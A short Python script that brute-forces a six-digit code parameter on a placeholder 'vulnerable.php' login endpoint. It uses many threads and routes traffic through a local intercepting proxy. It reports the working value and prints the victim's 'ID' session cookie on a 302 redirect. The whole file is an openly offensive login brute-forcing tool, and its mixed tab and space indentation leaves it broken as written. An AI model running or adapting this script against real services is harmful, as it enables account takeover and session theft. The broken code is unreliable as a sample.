import requests
import concurrent.futures


def brute(value):
	url = "https://vulnerable-point/vulnerable/vulnerable.php?e=%s&id=1&m=&membid=1"  %value
	proxy = {"http":"http://127.0.0.1:8080"}
	dataaa = {'login':'1' , 'cods':'0'}
	headers = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Content-Type':'application/x-www-form-urlencoded'}
	r = requests.post(url, data=dataaa, headers=headers, proxies=proxy, allow_redirects=False)
	# redirection indicates a successful login
  if r.status_code == 302:
		print ("succeed with value: %s" %value)
		print (r.cookies['ID'])

def main():
	
  # multi-threading
	with concurrent.futures.ThreadPoolExecutor() as executor:
		results = [executor.submit(brute,i) for i in range (111111 , 999999)]
		

if __name__ == "__main__":
	main()
 
